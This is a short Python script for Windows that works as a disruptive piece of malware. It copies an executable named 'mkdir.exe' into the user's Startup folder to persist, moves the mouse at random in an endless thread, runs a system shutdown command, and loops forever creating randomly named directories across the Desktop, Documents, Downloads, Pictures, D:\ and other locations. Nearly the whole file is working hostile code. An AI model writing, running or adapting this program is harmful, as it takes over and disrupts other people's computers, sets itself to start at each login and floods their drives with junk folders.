from os import getcwd, mkdir, system
from getpass import getuser
from random import sample, randint
from pynput.mouse import Controller
from threading import Thread
from shutil import copy


def copy_startup(): # Copy the program to start up
    startup = 'C:\\Users\\' + getuser() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    copy('mkdir.exe', startup)


def move_mouse(): # Move the mouse randomly
    mouse = Controller()
    while True:
        x = randint(randint(-5, 0), randint(0, 5))
        y = randint(randint(-5, 0), randint(0, 5))
        mouse.move(x, y)


Thread(target=move_mouse).start()
Thread(target=copy_startup).start()
username = getuser()

# Get the addreses
addres_1 = getcwd()
addres_2 = "D:\\"
addres_3 = "C:\\Users\\Public"
addres_4 = "C:\\Users\\" + username + "\\Desktop"
addres_5 = "C:\\Users\\" + username + "\\Downloads"
addres_6 = "C:\\Users\\" + username + "\\Documents"
addres_7 = "C:\\Users\\" + username + "\\Pictures"
addres_8 = "C:\\Intel"

system("shutdown/s") # Turn off the system ofter 10 sec
while True:
    name = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789(_!@#$%^&=+-`~)'
    
    directory = "".join(sample(name, 10)) # Make random name for directory
    # Create the directories
    mkdir(addres_1 + "\\{}".format(directory))
    mkdir(addres_2 + "\\{}".format(directory))
    mkdir(addres_3 + "\\{}".format(directory))
    mkdir(addres_4 + "\\{}".format(directory))
    mkdir(addres_5 + "\\{}".format(directory))
    mkdir(addres_6 + "\\{}".format(directory))
    mkdir(addres_7 + "\\{}".format(directory))
    mkdir(addres_8 + "\\{}".format(directory))
